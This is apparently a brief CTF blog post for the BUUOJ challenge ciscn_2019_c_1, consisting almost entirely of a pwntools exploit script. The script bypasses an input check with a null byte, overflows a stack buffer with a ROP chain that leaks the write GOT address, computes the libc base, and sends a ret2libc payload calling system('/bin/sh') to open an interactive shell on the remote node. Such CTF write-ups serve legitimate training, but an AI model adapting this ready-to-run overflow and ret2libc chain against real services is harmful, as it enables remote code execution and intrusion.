---
title: ROP ciscn_2019_c_1
tags: [ctf-pwn,exp]
date: 2022-11-16 19:07:00
excerpt: exp
---

**题目**

<https://buuoj.cn/challenges#ciscn_2019_c_1>

**Exp**

```python
from pwn import *

# p = process('./pwn')
p = remote('node4.buuoj.cn',28818)
e = ELF('./pwn')

#payload 1
payload1 = '\x00' + '\xff' * 7
p.sendline(payload1)
p.recvuntil("Correct\n")

#payload 2
payload2 = (231 + 4) * b'a' + p32(e.plt['write']) + p32(0x08048825) +p32(1) + p32(e.got['write']) + p32(4)

p.sendline(payload2)

# leak addr
write_got = u32(p.recv(4))
print(hex(write_got))

#payload 3
libc = ELF("./libc-2.23.so")
libc.address =  write_got - libc.sym['write']
system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
p.sendline(payload1)
payload3 =  (231 + 4) * b'a' + p32(system) + p32(0xdeadbeef) + p32(binsh)
p.sendline(payload3)

p.interactive()
```